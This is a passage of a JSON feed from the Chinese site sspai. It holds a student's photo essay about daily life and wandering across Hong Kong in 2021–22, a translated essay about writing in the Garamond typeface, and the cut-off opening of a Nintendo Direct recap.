src=\"https://cdn.sspai.com/2022/01/22/c412a6a701976285ad3e48e0da6bc797.jpg\"><figcaption>大学图书馆前广场</figcaption></figure><p>到了下学期，我的大部分课程的课室都在山脚的伍何曼原楼或者康本国际学术园，所以我基本就不用坐校车了。在这个过程中，我也发现了平时没发现的山脚好去处。</p>\n<p>如果家里的早餐已经告罄或者我来不及吃早餐，我就会去善衡书院的学生饭堂吃一顿早餐。我一般会选择蛋治餐肉套餐，把有点干身的面包换成薯饼，加上热的阿华田一共 25 块港币，吃完，走过马路就是伍何曼原楼的顶楼，很方便就能到课室。中午下课后，我会走几步就能到众志堂，吃完午饭沿着哲径散一散步，然后崇基图书馆睡一会儿觉后开始自习。晚上会在众志堂或者善衡书院的学生饭堂解决，如果去晚了饭堂已经不能够堂食，我就会把晚餐拿到众志堂旁边崇基湖的椅子上一边看着小情侣们谈恋爱一边吃。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/93a6bc926005c068152d81d542efdfc5.jpg\"><figcaption>崇基湖畔的小情侣</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/9f18042337a67cfca73d4df1f068e273.jpg\"><figcaption>最近解锁了野餐的新方式</figcaption></figure><p>晚上的学校和上午是完全不同的。清冽的山风让校园的夏天变得清爽，也让冬天变得更加寒冷。天色暗下来，满山谷就充斥着各种动物的鸣叫，包括我唤得出名字以及唤不出名字的。道路上除了时不时经过的校车外行人极少，我一直很享受自己走下山路的时刻，因为路上没有什么人，会有种自由的感觉。同时，这是一个很好的拍摄的时机。世界在夜晚的时候是很纯粹的，只有光和影，只要确保画面线条的横平竖直以及舒服的构图就比较好了。</p>\n<p>如果我有晚课，或者从图书馆走下山的时候，在确保周围没有人的时候，我就会悄悄把口罩摘下来一会儿，深吸一口气，空气里面飘着树叶和溪流清新的味道，混杂着一点潮湿的气息，就和我之前本科学校山顶小操场的味道一样。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/53d4558dba6719b623faa6fac265a772.jpeg\"><figcaption>夜晚 大学图书馆前的百万大道</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/cc475b0de2c535f6c7b234eb42be8412.jpeg\"><figcaption>大学体育场</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/d42c0db9cd78340ce15a54017487235a.jpeg\"><figcaption>善衡书院 陈震夏馆旁</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/4f0b9b5283a8f78c94bd4e53984051b5.jpeg\"><figcaption>下山的道路</figcaption></figure><h2>通勤路上</h2>\n<p>从我的住处去到地铁站需要先经过一座桥。这座桥有个好听的名字，叫沙燕桥。当天气好的时候，走在桥上就会看到桥下的水面的粼粼波光。到达河对岸后，会经过一条地下隧道，颜色是我很喜欢的天蓝色和白色的搭配。平时走的人不多，不管是白天和夜晚都会很明亮。有时候晚上下课已经九点多了，我走在没有人的隧道里就会唱着歌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/0427cd1182023bb68045b7069230d7b2.gif\"><figcaption>城门河</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/28/ab3ef683c6ff5ea2d0fe5b1686b44bf4.jpg\"><figcaption>河对岸的地下隧道</figcaption></figure><p>周末如果作业比较多，我就会到威尔斯亲王医院的医学院图书馆自习。从我家到亲王医院的路上会经过一些学校，墙壁上都画满了可爱的卡通，有时候在街上也会看到牵着手的小情侣，继续往前走还有一个加油站，一些屋苑，一所浸信会的小教堂。这是一条颜色鲜艳的通勤路线，香港的蓝天真的是一个很神奇的东西，哪怕平平无奇的建筑，只要天气够好够通透，都会让整个世界的色彩变得鲜艳起来。这个时候我才发现，原来香港的建筑也不是只有逼仄，还有一点的活泼和浪漫。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/fc183effbf33f175940de63fea9649ff.jpg\"><figcaption>插桅杆街附近</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/01fad8941be972bb0e2acb71c1629061.jpeg\"><figcaption>沙田围路附近</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/ca397647d9a2d70fd14279524f3877cc.jpeg\"><figcaption>岗背街附近</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/9174b84256c57504443c20357a6e6e84.jpeg\"><figcaption>圆洲角路附近</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/28/9a5cd36a88d89932516a17cb65ff00e2.jpg\"><figcaption>圆洲角路附近</figcaption></figure><p>香港岛我平时很少去，东区就更少了，哪怕我去拍照都是去中西区。但是因为实习的缘故，我不得不每天往来新界的沙田和港岛东区的柴湾。我要先从新界坐地铁到红磡，然后转乘巴士经红磡过海隧道，走东区走廊才能到达目的地。不得不说东区走廊确实是非常漂亮，如果天气好的话，沿着海边公路行驶的时候确实一件乐事。唯一需要担心的就是太阳太晒。</p>\n<p>虽然大多数都是在公司的饭堂吃饭，但是最后一天还是和一起实习的朋友一起沿着海边走到杏花村地铁站附近的商城吃了顿好的。这个时候我才发现冬天走在阳光底下是多么舒服的一件事情，可惜已经没有机会了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/464b8aa15832e9b194407191007840b9.jpg\"><figcaption>路上经过的车站</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/d1dcb8f03718212b2e4dd64632bfd331.jpeg\"><figcaption>从东区走廊遥望九龙</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/22/8bc4505eb20686fd08cde37c2bfd0f3c.jpeg\"><figcaption>天气好的时候，东区走廊风景也是一流的</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/02/1d93c4dac312dda74050f0dd92c62583.jpg\"><figcaption>实习单位附近的建筑</figcaption></figure><h2>夜静渔村</h2>\n<p>鉴于疫情发展情况，港府收紧了社交距离措施， 1 月 7 日晚上六点起，全港食肆禁止堂食。对于一些传统酒楼食肆的打击无疑是显而易见的，而对于位于鲤鱼门一些专营海鲜的传统食肆影响更甚，因为他们更加依赖于线下的家庭聚会和晚宴。</p>\n<p>鲤鱼门近海，店家会承接各种海鲜来料加工。有一些游客会先把原料给到一些海鲜酒家，叮嘱好想要的烹调方法，然后就在码头搭船出海游玩，回来就已经能看到一大盆热辣辣的避风塘炒蟹或者蒜蓉粉丝扇贝了。约上三两好友就着啤酒吃着各种海鲜，靠着这种「痛风套餐」和随性舒适的就餐气氛就是这种餐饮店的生存法门。</p>\n<p>我曾经在去年十月份曾经去过一次鲤鱼门，印象最深的是非常明显的海水的腥味以及仿佛永远不会停息的锅铲碰撞和炉灶冒火时的声音，还有食客们觥筹交错以及阵阵的笑声。 1 月 7 号，禁止堂食当天，我再次去了一次鲤鱼门和附近的三家村。虽然我已经做了一些心理准备，但是实际上去到以后比我想象中的更加冷清。我遇到的店家全部都已经关门了，大门都用木板封了起来，小巷里冷冷清清，只有一家卖老婆饼的店铺依然开着门。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/48e3cbef0f559baaaee8aba5aba21ef2.jpeg\"><figcaption>鲤鱼门的入口</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/8def5f300fdceadefd9f0441292a6aa4.jpeg\"><figcaption>空荡荡的小巷</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/c8a2d88ef1bcc4b5f16e8341c76d6807.jpeg\"><figcaption>只有这家店铺在坚持</figcaption></figure><p>鲤鱼门后面走到三家村，作为平时的旅游胜地也显得冷清，但是在虚掩着的门后面隐隐有一些剁肉饼和炒菜的声音传出来，电视在播着新闻，时不时能听到小朋友的喧闹声和大人压低了声音的喝止。</p>\n<p>生活再艰难，生活还是要继续。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/8d0f1064cc4aee50c24a1f0df1ddfbe2.jpeg\"><figcaption>三家村的巷子一</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/637a051b57eaa23d5a51d4d7a7291d6d.jpeg\"><figcaption>三家村的巷子二</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/6314ec64fcbedeb71001bbe489cda39c.jpeg\"><figcaption>转角有一大簇很漂亮的花</figcaption></figure><h2>两面九龙</h2>\n<p>油麻地、尖沙咀和旺角合称油尖旺区，是香港十八区面积最小的一个，但是估计也是知名度最高的一个。虽然它们三个经常被合称成为一区，一条弥敦道由北向南贯穿其中，从北面的界限街一直延伸至南部的尖沙咀海旁，这三个区组成了九龙半岛的西南部。油尖旺区是一个挺「分裂」的地区，沿着弥敦道，你可以看到高楼大厦，看到欧式的教堂，看到让人眼花缭乱的灯饰，走在路上的是西装革履或者打扮时尚精致的年轻人。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/25/ae30665483b363963377e042f47737a2.jpeg\"><figcaption>圣诞节假期的西九龙</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/25/9cebcfd67eb55a61503daa865f2e1314.jpg\"><figcaption>尖沙咀 K11 </figcaption></figure><p>但是如果你随意拐入一条旁边稍窄的街道，通菜街、西洋菜街、砵兰街等等，你就会发现两旁的高楼逐渐被唐楼取代，街头时不时会出现人头攒动的市集，卖玩具的，卖内衣的，卖鞋子的，卖古玩的还有卖旅行箱和书包的，应有尽有。街上多了一些衣着悠闲的中老年人，也有用拖车拖着比她自己还要高很多的垃圾山的老奶奶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/25/a304a0189bf63e9782da237d9be77c8b.jpg\"><figcaption>尖沙咀 金巴利道附近</figcaption></figure><p>深水埗是我最喜欢去的地方，因为我喜欢「烟火气」，对我而言，深水埗就是我认为香港最有烟火气的地方。因为白天基本没机会四处逛，我通常只能够下午或者傍晚才能到处看看。一到夜晚，白天深水埗时不时透露出来的衰退和破败不见了，从钦州街到南昌街，从大南街到石硖尾，街道上熙熙攘攘，烧腊店铺前面排满了人，市集上的卖家都尽力招徕用户。一些小路边上有各种各样的大排档，厨师甚至直接在街边就架起锅开始炒菜，火苗窜得很高，小炒的「镬气」伴随着香味大张旗鼓地弥漫开来。走在喧闹的大街上，被粤语和粤菜的味道围绕，我莫名会感觉到一种内心的安全感。唯一遗憾的是没有抓紧时间尝尝深水埗的大排档。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/15f0be60d4af09cd98294588b8b47ff4.jpg\"><figcaption>深水埗 黄竹街</figcaption></figure><p>深水埗最近也新开了很多咖啡厅，成为很多「文青」打卡的地点，除了一些为了等一锅上好的啫啫煲或者馅多皮薄的水饺而愿意等上好几个小时的叔叔阿姨们，也有很多年轻人拿着重新复兴的胶片相机，走进极简风格设计的咖啡厅，叫上两杯拿铁愉快地聊上一个下午。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/2b4b608f0a739d99894c75924f39d561.png\"><figcaption>塘尾 界限街</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/068e1d94fbbd3855460a5b9da1cbaeb6.png\"><figcaption>深水埗 基隆街</figcaption></figure><p>这就是九龙半岛了吧，一边怀旧，一边潮流；一面享受生活，一面拼命生存。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/a974c5ceb411bd506d35c911fac1562b.png\"><figcaption>深水埗 基隆街</figcaption></figure><h2>港岛之夜</h2>\n<p>夜晚走在港岛上，我一直觉得会有种剥离感。不同于新界和九龙，港岛给我的感觉更多的是一种纯粹和疏离的精致。是的，这里的确很好看，但是我永远没有办法融入这里，真切地感受这里。在夜晚，平时热闹的街道上空空的，宽阔的街道上除了路边停着的跑车外，就只有路灯照射下的欧式建筑。作为最早割让给英国的殖民地，香港岛的欧式建筑风格也是最强烈的。平安夜那天，我在金钟附近的教堂凑了个热闹听了一场弥撒，走在快十二点的港岛，看着米色的建筑外墙、有轨电车的车轨、空空的街道，仿佛回到了 2017 年在德国魏玛度过的圣诞节时光。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/7335d8e0a4e83bd4696e43ea7fcf2406.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/a0b5fadef7ac89999f551b9f6419048d.jpg\"><figcaption>中环 圣约翰座堂</figcaption></figure><p>继续往前走，到达上环附近后，地势变得陡峭起来，需要不停地爬坡，但是至少不会这么冷清了。酒吧和外国人多了起来，时不时能看到一群群的外国人站在街角端着酒杯聊天。也有很多不同地区的菜馆，越南菜，日本料理，或者是粤菜。平时人流很多的大馆和元创方变得安静了不少，虽然只是晚上八点多一点，但是很多店铺已经关门了，但是当作散步逛一下还是不错的。夜晚的港岛没有了白天时候的拥挤和喧闹，它是安静得像是有些疲惫，但好像也放下了防备。往来的行人虽然戴着口罩，但是总感觉他们的眼神变得柔软了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/fa24ec51af2d6d288d8958fa2244b0b9.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/e231ddcf0165518c65536385e03ca1a6.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/bd2cc0de0097f3f6b59d1c054309cd03.jpg\"><figcaption>上环</figcaption></figure><p>西营盘和香港大学附近我也去过几次。在香港大学找同学玩，或者去完西环泳棚以后，我就会和同学一起去石塘咀街市吃海鲜大排档。可能因为主要做附近街坊和学生生意，其实并不贵，人均消费也就100港币出头。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/eefc5dddfe96527281ac274cceb59ae4.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/14b7b510d0800e4d77498dff6677cd2d.jpg\"><figcaption>石塘咀街市及熟食中心</figcaption></figure><p>吃完以后如果有时间就会去中西区海滨长廊，夜晚的人群里，内地人和外国人浓度都很高，沿着海滨长廊往东走，能够同时看到昂船洲大桥，尖沙咀和中环的海景。吃饱喝足遇上海风轻拂，应该是最快乐的瞬间之一了。我们几个男生聊到兴起，还会一起说笑一起唱歌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/ee34567e3765e77b608cf7c485656843.jpg\"><figcaption>西营盘</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/01/02dcc5867b70c96e352433a4113cb689.jpg\"><figcaption>坚尼地城</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/28/be05c198043cd21090d49e7c0e97950c.jpg\"><figcaption>昂船洲大桥</figcaption></figure><h2>那一片海</h2>\n<p>在香港，很多地方都能够看到海，因为海岸线曲折和地形切割的原因，香港分割出了很多微型的海滩。也许是因为这样的地理特点，在香港，去海边吹吹风并不是一个很遥远的词语，有的海滩可能搭乘几站地铁就能到达，非常方便。在我去过的几个海滩中，不同的海也有着不同的风格。</p>\n<p>维多利亚港的海是香港的名片。维港的两岸永远是精致的。十二月份，如果我下班后还不是太累的话，就会乘坐大巴到红磡过海隧道，在尖沙咀的 K11 买一杯喜茶，然后往南，沿着星光大道走到九广铁路钟楼前面行人椅休息下，如果时间掐得好的话还能够顺便看一下幻彩咏香江灯光秀。2021 年的香港，已经没有我几年前来香港时的拥挤，虽然灯光秀也不是非常吸引人，但是在海边发发呆总归是不错的选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/7e4ce1a9415a547c38801c3db07ff39f.jpg\"><figcaption>尖沙咀 九广列车钟楼</figcaption></figure><p>浅水湾位于港岛南部。我第一次听这个地名来自谭咏麟的《情缘巴士站》：「正是你，我没逃避，在这浅水湾的一个终站」。浅水湾在二十世纪初就是香港有名的悠闲度假圣地，建筑优雅而高贵，最重要的建筑莫过于浅水湾酒店。1943 年，张爱玲创作《倾城之恋》时，将这里描绘为白流苏与范柳原的初见之地。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/e42054b1796299ba60b11d67836d06cc.jpg\"><figcaption>香港岛 浅水湾</figcaption></figure><p>马鞍山海滨长廊就显得平民许多了。长廊从地铁大水坑延伸到乌溪沙，全长三公里。白天的时候，在马鞍山至乌溪沙段会停着很多小船，在社交距离政策还没有收紧的阶段，每到傍晚海滩上就会有人架起烤炉，远远就能够闻到肉香味和听到噼里啪啦的烧烤声。</p>\n<p>上学期期末在图书馆赶完作业的时候，我们小组就会搭几站地铁去到乌溪沙的海边聊一会儿天。晚上的海滩人很少，也有点冷，但是我们还是很喜欢去马鞍山的海滩，因为觉得很放松，可以大声说笑，把生活和学业上的各种烦恼都抛诸脑后。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/7e3bf487a9dc73acb97216f6663ec286.jpg\"><figcaption>乌溪沙</figcaption></figure><p>域多利道是我新探索到的一个好去处。这条道路基本上就是香港岛西部勾勒出的一条弧线，沿着这条路走，从坚尼地城到薄扶林，右侧都能够看到非常漂亮的海景。从我住的地方去到域多利道并不方便，需要转三次地铁，但是我还是认为有空去那里走走是很值得的。如果今年年中的沙中线能够正式通车，把东铁线和港岛线相连，那么来域多利道就会方便不少。</p>\n<p>在这条路上有两个比较著名的打卡点，一个是金钟泳棚，距离坚尼地城大概十分钟路程；另一个是沙湾径的沙湾泳棚，距离金钟泳棚大概二十分钟路程。虽然在坚尼地城有小巴可以直接去到沙湾泳棚，但如果不赶时间的话，还是建议可以自己慢慢走。因为路上的风光也是很不错的。这里的海相比于马鞍山和尖沙咀的海显得更加的粗犷和原始，海水汹涌拍打在岸边的巨石，激起巨大的水花。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/8f523243d8bbcdba4f231fa3a002dabd.jpg\"><figcaption>西环泳棚</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/31/6b88d4802431862f38f5de79e1e8f53f.jpg\"><figcaption>走在域多利道上的风景</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/31/640dce36130cdf178dc134fae17d4bef.jpg\"><figcaption>沙湾泳棚</figcaption></figure><h2>探寻离岛</h2>\n<p>说到香港的海，离岛是一个绕不开的话题。离岛区是香港十八区中面积最大的一区，主要包括香港南面和西南面的多个海岛。在中环，一共有七个码头，对应出发前往不同的离岛。如果周末天气好，睡到自然醒的话就可以去中环码头看看哪个码头即将有船出发，就可以直接刷八达通上船，享受一次说走就走的旅程。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/06/69e696a3fe2a0c714faf82fe85313e63.jpg\"><figcaption>南丫岛 洪圣爷湾</figcaption></figure><p>我自己今年其实没怎么出海，但是我身边的朋友已经去了挺多的离岛了。喜欢热闹和比较成熟的基础设施和商业模式的同学会选择去长洲岛或者南丫岛；如果更喜欢原始的野外景观就可以去塔门；如果喜欢一个人独自旅游的话，坪洲岛也是一个不错的选择。</p>\n<p>我上周就去了坪洲岛。本来对于它并没有什么期待。主要是因为塔门风太大，长洲岛想天气好的时候再去，南丫岛和马湾已经去过了，所以才选择了坪洲岛。如果从中环出发，乘坐普通轮渡到达坪洲岛只需要 30 分钟左右。刚到岛上时，因为天气不好，本来也没打算拍什么图片，但是最后发现自己竟然还很喜欢这里。坪洲岛地方不大，绕一圈只需要大半天。从码头下船，走几步就能钻进街市。</p>\n<p>我可太爱这种老的街道了。杂货铺，五金店，鲜花铺，食肆毫不在意地堆在一起，街道狭窄，往来的人都会很有默契地侧着身子走路，倒也不会显得拥堵。店铺名字用的是正楷，一些饭馆招牌上的金箔已经有点掉落，门口外面摆着一些鲮鱼丸，用蚊帐罩了起来。我往里面看一眼，墙体早已不是白色，而是显得有点发黄。菜单也是用手誊抄在红纸上然后贴在显眼的位置。但是不知道为什么，反而觉得有种莫名的亲切感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/01/bb73c76d03ee7513b97cdbb5ba14ce3d.jpg\"><figcaption>坪洲岛的街市</figcaption></figure><p>海湾在坪洲岛的另外一面。当我们走到东湾海滩的时候，本来阴天的时候竟然出现了几十分钟的太阳。随着天气逐渐放晴，海边的礁石仿佛也有了光彩，海水从墨绿变成了翠绿色和宝蓝色。随着雾气逐渐退去，远处的尖沙咀的建筑群也变得清晰起来。这个时候，我简单拍了几张照片后，就什么都不做，在一块礁石上望着海浪发呆。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/01/19468e8cbc1f1d5df316d877b28e2ebe.jpg\"><figcaption>坪洲岛 东湾海滩</figcaption></figure><h2>结尾</h2>\n<p>一直到 1 月 7 日，我以为自己是幸运的，以为躲过了香港前四次疫情，却没想到还是被第五次疫情逮个正着，本来计划好的很多事情突然被摁下了暂停键。我不清楚是不是这半年已经是我能够探索香港的最好机会了。现在写下这段文字时，我心里难免百感交集。我有一个坏习惯，享受一段好时光久了，就会一厢情愿地以为好时光会一直延续下去。但显然并不是这样子的。</p>\n<p>一月中下旬的香港，阴郁潮湿。每天起来望着窗户玻璃凝结的水珠以及灰白的天空，内心的烦躁就不可以抑制地往上涌，这个时候我会选择翻看之前拍照的图片，重新想起 2021 年四处游走的点点滴滴，给我一点点内心的安慰。这时我就会庆幸，尽管自己很懒，但是还是养成了记录的习惯，没有一天放弃过观察和记录我的生活。</p>\n<p>农历新年来了，希望诸位虎年身体健康。也请大家有机会的时候多多记录，无论是用相机或者手机，视频或者图片。因为这些都是我们独一无二且无法重来的生活记忆呀。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/26/6e5f6ac8a6a4798a7d66aebeb4c9ce7d.png\"><figcaption>希望旅程未完待续</figcaption></figure>\n","link":"https://sspai.com/post/71075"},{"title":"译文 | 字体小变动，心境大不同：为什么我用加拉蒙码字","date":"2022-02-12 06:44:54","description":"\n<p><strong>按：</strong> 本文 <a href=\"https://www.nytimes.com/2022/02/01/magazine/garamond.html\">原文</a> 发表在 2022 年 2 月 6 日出版的《纽约时报杂志》（<i>The New York Times Magazine</i>）上，作者为 R.E.Hawley，作家、设计师，其文章曾发表于《新共和》（<i>The New Republic</i>）、<i>Gawker</i> 等。文章的翻译和发布已得到作者同意。</p>\n<p>本文短小精悍，但提及了较多字体和字体排印概念，可参考下图便于直观理解（非专业观点，谨供参考）：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/article/26b7a8f4f1a2bbed085b6508010f1937\" alt=\"\"></figure><hr>\n<blockquote><p>任何创造性产出都是由一连串微小的自我错觉支撑的。换一种字体让我对写出的东西有信心。</p></blockquote>\n<p>小说、信件、收据——无论写什么文件，我都得先点击「字体」下拉菜单，斟酌取舍，然后才能动笔。这里有些很明显的选项：可靠但寡淡的 Times New Roman；清晰而简朴的 Arial；整洁又灵活的 Proxima Nova。但遇到那些排版需要精雕细琢的场合，又该用什么呢？</p>\n<p>毫无疑问，我想说的是精致、优雅的加拉蒙（Garamond）。实际上，加拉蒙不是一种字体，而是一组字体，其来源可上溯到 16 世纪的法国，由一个叫克洛德·加拉蒙（Claude Garamond）的人创作。加拉蒙生活和工作于一个过渡时期，当时，老式的黑体字（black-letter，亦称哥特手写体、旧式英语手写体——译注）字体正在让位于更现代的罗马字体。加拉蒙的字体设计考究，类似于用笔墨手写字体，但更易于辨认；这启发了 17 世纪一位名叫让·雅农（Jean Jannon）的印刷商，制作了一种类似的字体（也以加拉蒙命名），最终引来了一场复兴。</p>\n<p>无论加拉蒙、雅农还是其他人设计的版本，各式加拉蒙都具有一些核心特征。它们的衬线，即 i、r 等字母上额外的细微笔画，往往是倾斜或略微凹陷的。加拉蒙的「x 字高」（x-height，即 e、a 当然还有 x 等小写字母的高度）较低，而横画（crossbar，即 e 等字母中的横笔）的位置较高。加拉蒙德笔画多变，而且充满个性——毕竟它们最初是仿照手写体而设计的。最别具一格的笔画往往出现在斜体中，例如小写 k 上的环形、小写 h 底部的上挑等。</p>\n<p>加拉蒙惹人喜爱，但评价却两极分化。很多人从其偏低的 x 字高、挑剔的笔画细节中，获得了阅读印刷品般的愉悦体验；但与笔画更统一的无衬线字体相比，这些特征也降低了在屏幕上显示时的清晰度。有人觉得优雅，也有人觉得矫情。对于喜欢用加拉蒙的人，有这样一种刻板印象：「加拉蒙党」（如果你愿意这么称呼的话）恼人地端着架子，自诩渊博到觉得他文章的分量非得用 500 年历史的法国字体传达。（在电视剧《神烦警探》（<i>Brooklyn Nine-Nine</i>）中，一个角色急于给他 A 型人格的准岳父留下印象，在机场举着加拉蒙字体的接机牌迎接他。「你是个加拉蒙党哦？」岳父笑着说。）因此，加拉蒙和书生气知识分子最迂腐、肤浅的审美联系起来，随后又被那些懂行的人归为笨拙，也就不奇怪了。</p>\n<p>我把自己归为那类懂行的人。作为一名平面设计师，我每周几个小时花来翻找字体库，为每个项目寻找完美的搭配。很少有能准确描述需求的客户，他们只能判断什么不行。归类字体的技术要素要多少有多少，但字体的美学和情感影响往往归结为无法形容的东西——一种格调。而随着时间推移，字体置于新潮流之侧，其格调也可能发生变化。可以想像，对于 16 世纪中叶的读者，加拉蒙因其手写笔画显得更为非正式。但在我们的时代，便于在屏幕上扫读的无衬线字体和留白、极简美学是主导，同样的加拉蒙就有了巴洛克的格调和老式的花哨。</p>\n<p>但我们都有需要花哨的时候。不同于「加拉蒙党」，我发现我的自信经常短缺，特别是在试图写作的过程中。这种缺乏自信反映到书面上，通常就是实用至上、回避风险，但其实可以更经修饰的文章。长期以来，我更喜欢用 Avenir 或 Montserrat 这样实用主义的无衬线体码字。这种字体码出的词句有一种非正式感，仿佛只是用手机上的备忘录 app 草草记下的。对我这种难以在纸上码出字来的写手，倒也很合适。然而，当我看到方块一般的无衬线字体占满屏幕时，我又迟疑了，偶尔会听到头脑深处一个低沉、圆滑的声音问到，也许我就是不太擅长做这个，是不是？</p>\n<p>然后，几个月前，当我打量一个一直在断断续续进行的长期项目时，鼠标兜兜转转指在了排版软件的字体菜单上。轻轻一点，文字换上了加拉蒙字体重新浮现。我几乎倒吸一口气。我的文字披戴着柔和的衬线、淡雅的装饰，充满了新的生命力；隔着屏幕，我看到了藏在文字背后另一个我的倒影，一个存在值得被尊重的我。</p>\n<p>诚然，靠自欺来对工作产生自信有点滑稽，像孩子着迷于魔术那样好骗则更是荒谬。但任何创造性产出都是由一连串微小的自我错觉支撑的；这就像是一种护栏，防止自己滑向自我怀疑和绝望的深渊。幸运的是，心态是可塑的：我们身着华服，未必是为了去哪出席，而仅仅是为了顾镜自赏时，心情能和衣装一样亮丽。所以，我会接着在 Word 文档里点击「全选」，就在那片刻，让我相信我的文笔就像用来显示的字体那样华丽。</p>\n<hr>\n<p><strong>延伸资料：</strong></p>\n<ul>\n<li>关于加拉蒙字体的更多中文讨论和延伸阅读，可参考播客 <a href=\"https://www.thetype.com/typechat/ep-090/\">《字谈字畅》第 90 期</a>（巴黎城内加拉蒙）及其附注。</li>\n<li>如希望尝试加拉蒙字体：<ul>\n<li>微软随 Microsoft Office 提供了<a href=\"https://docs.microsoft.com/en-us/typography/font-list/garamond\">蒙纳（Monotype）版本的 Garamond</a>（在 Microsoft 365 版本中作为云端字体按需下载），但仅包含常规体、粗体和斜体三种样式。</li>\n<li>Adobe 随 Adobe Fonts 服务（包含于当前几乎所有 Adobe Creative Cloud 订阅计划）提供了多种版本的 Garamond，包括较为经典的 <a href=\"https://fonts.adobe.com/fonts/adobe-garamond\">Adobe Garamond</a>。</li>\n<li>此外，也可以选择开源免费的 <a href=\"http://www.georgduffner.at/ebgaramond/\">EB Garamond</a>。</li>\n</ul>\n</li>\n</ul>\n","link":"https://sspai.com/post/71369"},{"title":"任天堂 2022 春季直面会之后，我们为你带来了这份「种 / 拔草」参考建议","date":"2022-02-12 03:27:13","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>北京时间 2022 年 2 月 10 日凌晨 6 时，任天堂 2022 春季直面会如期展开。作为全世界 NS 玩家翘首以盼的游戏「峰会」，本场直面会无疑是任天堂对微软和索尼两大巨头竞相收购工作室的有力回应。尽管最令人期待的《塞尔达传说：旷野之息 2》并未有新消息放出，但在 40 分钟的直面会时长中悉数登场的第一方及第三方大作也赚够了玩家的眼球。</p>\n<p>与 PlayStation 或 Xbox 这类十分注重性能表现的主机平台不同，NS 